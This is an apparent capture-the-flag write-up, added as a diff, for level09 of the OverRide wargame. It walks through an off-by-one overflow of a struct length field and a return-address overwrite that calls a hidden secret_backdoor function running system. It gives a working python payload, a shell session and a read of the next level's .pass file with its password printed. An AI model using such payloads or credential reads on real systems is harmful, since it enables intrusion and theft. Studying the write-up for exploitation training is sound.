@@ -1,0 +1,89 @@
+Introduction: 
+
+Here we hava a program that as you an username, then a welcome. 
+
+We can try an blinded overflow or read code. 
+
+In code we can see that we have a struct which contain 3 variables:
+
+----> message[140]
+----> username[40]
+----> message_len (int)
+
+When we go in the part of code wich attribute username after user wrote it,
+we can see that there is a condition if the counter is <= 40 (so  41 is check)
+
+Seem's a good point !
+
+In a second part we can see a function that call "system" with an arg:
+
+000000000000088c <secret_backdoor>:
+ 88c:	55                   	push   %rbp
+ 88d:	48 89 e5             	mov    %rsp,%rbp
+ 890:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
+ 894:	48 8b 05 1d 17 20 00 	mov    0x20171d(%rip),%rax        # 201fb8 <_DYNAMIC+0x198>
+ 89b:	48 8b 00             	mov    (%rax),%rax
+ 89e:	48 89 c2             	mov    %rax,%rdx
+ 8a1:	48 8d 45 80          	lea    -0x80(%rbp),%rax  <------------| With an arg get by fgets
+ 8a5:	be 80 00 00 00       	mov    $0x80,%esi                |    |
+ 8aa:	48 89 c7             	mov    %rax,%rdi                 |    |
+ 8ad:	e8 be fe ff ff       	callq  770 <fgets@plt> <---------|    |
+ 8b2:	48 8d 45 80          	lea    -0x80(%rbp),%rax <-------------|-----------|
+ 8b6:	48 89 c7             	mov    %rax,%rdi                                  |
+ 8b9:	e8 82 fe ff ff       	callq  740 <system@plt> <---------- call system <-|
+ 8be:	c9                   	leaveq
+ 8bf:	c3                   	retq
+
+
+So what we want now is call secret_backdoor function thanks an overflow
+
+But what can we do with an overflow of 1? 
+---> We see that in struct afred username there is an int which contain lenght of message. 
+    It is use by strincpy after to copy our input of message in message. 
+    We can to give us place in order to overflow. Let's choose big 255 --> FF
+
+STEP1 : Get EIP offset
+
+We know thanks this documentations:
+https://beta.hackndo.com/stack-introduction/
+https://beta.hackndo.com/retour-a-la-libc/
+That when you call a function this eip is save so thanks to the asm we can see that 192 bytes where given but
+we want to store our adress (adresse of secret_backdoor) in order to execute it.
+so 192 + 8 == 200
+
+--------------------------- Handle MSG ----------------------------------------
+ 0x00000000000008c0 <+0>: push   %rbp <--------| Save Start of Stack Frame
+ 18    0x00000000000008c1 <+1>: mov    %rsp,%rbp <---|
+ 19    0x00000000000008c4 <+4>: sub    $0xc0,%rsp <------ Give 192 bytes of memory
+
+ So we've got our payload schema : 
+
+         40 * [random char] + '\xff' + '\n' + 200 * [random char] + [SECRET BACKDOOR ADDRESS] + '\n' +"/bin/sh" + '\n'
+        <-------------------------------->
+                First fgets
+                                        <--------------------------------------------------->
+                                                           Second fgets
+                                                                                                <---------------->
+                                                                                                   Third fgets
+STEP 2: Get secret backdoor address
+
+(gdb) p secret_backdoor
+$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
+                                    <--------------->
+                                         Here
+
+STEP 3: Run exploit
+
+level09@OverRide:~$ (python -c 'print "\x90"*40+"\xff"+"\n"+"\x90"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"+"/bin/sh\n"'; cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
+>>: >: Msg sent!
+whoami
+end
+pwd
+/home/users/level09
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
